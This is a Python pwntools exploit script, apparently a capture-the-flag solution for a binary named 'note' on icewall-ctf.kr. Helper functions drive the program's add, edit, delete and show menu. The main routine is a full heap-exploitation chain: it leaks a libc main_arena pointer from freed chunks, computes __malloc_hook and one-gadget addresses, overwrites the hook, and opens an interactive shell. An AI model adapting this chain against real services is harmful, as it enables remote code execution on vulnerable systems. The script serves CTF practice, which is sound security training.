from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./note')
else :
	p = connect('icewall-ctf.kr', 10210)

def _add(idx, size, auto_recv=True):
	print '[Log] Heap Allocated: Index=%d, Size=%08X'%(idx, size)

	p.sendline('1')
	p.sendlineafter('idx : ', str(idx))
	p.sendlineafter('size : ', str(size))

	if auto_recv :
		p.recvuntil('del\n')

def _edit(idx, name, script, auto_recv=True):
	print '[Log] Heap Write: Index=%d'%idx
	print '      Name: '+name
	print '      Script: '+script

	p.sendline('2')
	p.sendlineafter('idx : ', str(idx))
	p.sendlineafter('name : ', name)
	p.sendlineafter('script : ', script)
	if auto_recv :
		p.recvuntil('del\n')

def _del(idx, auto_recv=True):
	print '[Log] Heap Free: Index=%d'%idx

	p.sendline('4')
	p.sendlineafter('idx : ', str(idx))
	if auto_recv :
		p.recvuntil('del\n')

def _show(idx, auto_recv=True):
	p.sendline('3')
	p.sendlineafter('idx : ', str(idx))

	p.recvuntil('name : ')	
	data_name = p.recvline()[:-1]
	p.recvuntil('script : ')
	data_script = p.recvline()[:-1]

	if auto_recv :
		p.recvuntil('del\n')

	return (data_name, data_script)

# Main Routine
heap = 0x6020A0

p.recvuntil('4:del\n')

_add(2, 0x1000)
_edit(2, 'A'*6, 'A'*6)
_add(3, 0x1000)
_edit(3, 'A'*6, 'A'*6)

_del(2)
_del(3)

_add(2, 0x1000)
_add(3, 0x1000)

recv_1 = _show(3)
main_arena = u64(recv_1[1].ljust(8, '\x00'))-96
malloc_hook = main_arena-0x10
one_shot_gadget = malloc_hook + (0x10a38c-0x3ebc30)

print '\n[Exploit] main_arena = '+hex(main_arena)
print '[Exploit] malloc_hook = '+hex(malloc_hook)
print '[Exploit] one_shot_gadget = '+hex(one_shot_gadget)+'\n'

_edit(2, 'A'*6, 'A'*6)
_edit(3, 'A'*6, 'A'*6)

_add(0, 0x20)   # Trash Chunk
_add(1, 0x20)   # Trash Chunk

_add(4, 0x20)
_edit(4, 'B'*6, 'B'*6)
_add(5, 0x20)
_edit(5, 'B'*6, 'B'*6)

_del(4)
_del(5)

_add(4, 0x1000)
_add(5, 0x1000)

_edit(5, 'D'*6, p64(0)*2+p64(malloc_hook)+p64(0x1000))
_edit(4, 'D'*6, p64(one_shot_gadget))

_add(6, 0x10, False)

p.interactive()
